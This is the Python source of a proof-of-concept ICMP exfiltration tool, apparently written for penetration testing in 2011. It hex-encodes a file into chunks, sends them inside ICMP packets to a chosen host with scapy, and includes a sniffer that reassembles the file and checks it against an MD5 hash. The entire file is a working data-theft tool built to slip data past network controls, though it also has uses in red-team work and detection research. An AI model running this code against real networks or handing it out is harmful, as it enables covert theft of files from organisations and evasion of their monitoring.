# PoC cheap ICMP data exfiltration tool, used to reassemble files sent in hex. 
# Usage:
# python icmp_shover.py -m <send|recv> -f <file> [-t <target>] [-c <chunksize>] [-v <verbosity>] [-d <seconds_btwn_packets>]
#
#
# glenn@sensepost.com / 2011

from scapy.all import *
import binascii
import hashlib
import sys
import time

#Vars for receiving files
last_seqn=-1
result=""
thesrc=""

#Vars for sending files
chunk_sz=20	#How many bytes of the file to send at a time
verbose=0
sleep_btwn_packets=0.01

mode=''
key=''
file=''
target=''

def usage():
	print 'Usage: '
	print ' python icmp_shover.py -m <send|recv> -f <file> [-t <target>] [-c <chunksize>] [-v <verbosity>] [-d <seconds_btwn_packets>]'
	print '\nglenn@sensepost.com / 2011' 

def send():
	print "[+] Send mode, sending \"%s\" to target \"%s\"" %(file,target)
	fsize_bytes=os.path.getsize(file)
	total_packets=(fsize_bytes / chunk_sz) +1
	print "[+] File is %d bytes, which will take %d ICMP packets (at %d bytes per packet)" %(fsize_bytes,total_packets,chunk_sz)
	f=open(file,"rb")
	i=1
	try:
		bytes_read = f.read(chunk_sz)
		while bytes_read:
			hex_data = binascii.hexlify(bytes_read)
			to_send = ':'.join(["@@@0",str(i),str(total_packets),hex_data])
			i+=1
			if(verbose>0):
				print "[-] Sending %s" %to_send
			sendp(Ether()/IP(dst=target)/ICMP()/to_send,verbose=0)
			time.sleep(sleep_btwn_packets)
			bytes_read = f.read(chunk_sz)

	finally:
		f.close()
		local_md5=md5_file(file)
		to_send = ':'.join(["@@@1",str(i),str(total_packets),local_md5])
		print "[+] Sending last packet with checksum."
		sendp(Ether()/IP(dst=target)/ICMP()/to_send,verbose=0) 

def recv():
	print "[+] Receive mode writing output to \"%s\"" %(file)
	sniff(filter="icmp", prn=catch_icmp)

def catch_icmp(x):
	global thesrc
	global last_seqn
	global result
	global thesrc
	global magic
	
	try:
		src=x.payload.src
		dst=x.payload.dst
		load=x.load
	except Exception:
		#print "[e] Unexpected packet %s" % (x)
		return
	if(verbose>0):
		print "[-] Got packet from %s with contents %s" %(src,load)
	if (load[:3]=='@@@'):			#to identify our special packets
		split = load[3:].split(":")
		is_last=int(split[0])
		seqn=int(split[1])
		total=int(split[2])
		data=split[3] 
		if(thesrc==""):
			thesrc=src
		#print "(seqn=%d, last_seqn=%d)" %(seqn, last_seqn)
		if(src==thesrc and seqn!=last_seqn):		#Ignore replies and duplicates
			if(last_seqn==-1):
				last_seqn=0
			if(seqn != last_seqn+1):
				sys.exit("Data came out of order. Was expecting %d, recieved %d. Exiting :(" %(last_seqn+1, seqn) )
			else:
				last_seqn=seqn
				
				if(is_last==1):
					outf=open(file,"wb")

					print "[+] Last chunk received. Decoding and writing to %s" %file
					for i in range(0,len(result),2):
						outf.write(binascii.a2b_hex(result[i:i+2]))
					outf.close()
					md5_remote=md5_file(file)
					md5_local=data

					if( md5_remote == md5_local):
						print "[*] Received MD5 matches local, nice! (%s)" %data
					else:
						print "[!] Received MD5 does not match local file, fail :( (rcv'd %s, expected %s)" %(md5_remote, md5_local)
					sys.exit()



				else:
					result += data

def md5_file(fname):

	f = open(fname,'rb')
	m = hashlib.md5()
	while True:
    		## Don't read the entire file at once...
    		data = f.read(10240)
    		if len(data) == 0:
        		break
    		m.update(data)
	f.close()
	return m.hexdigest()

#Process args
for a in range(1,len(sys.argv),2):
	try:
		if(sys.argv[a] == '-m'):
			mode=sys.argv[a+1]
#		elif(sys.argv[a] == '-k'):
#			key=sys.argv[a+1]
		elif(sys.argv[a] == '-f'):
			file=sys.argv[a+1]
		elif(sys.argv[a] == '-t'):
			target=sys.argv[a+1]
		elif(sys.argv[a] == '-c'):
			chunk_sz=int(sys.argv[a+1])
		elif(sys.argv[a] == '-v'):
			verbose=int(sys.argv[a+1])
		elif(sys.argv[a] == '-d'):
			sleep_btwn_packets=float(sys.argv[a+1])
		else:
			print "Bad args!"
			usage()
			exit()
	except:
		print "Bad args!"
		usage()
		exit()

print "ARgs: mode = %s, verbos = %s, cz = %s" %(mode,verbose,chunk_sz)

if( mode=='' or file=='' or (mode=='send' and target=='')):
	print "Bad args!"
	usage()
	exit()

if( mode == 'send'):
	send()
elif(mode == 'recv'):
	recv()
else:
	print "Bad mode!"
	usage()
	exit()

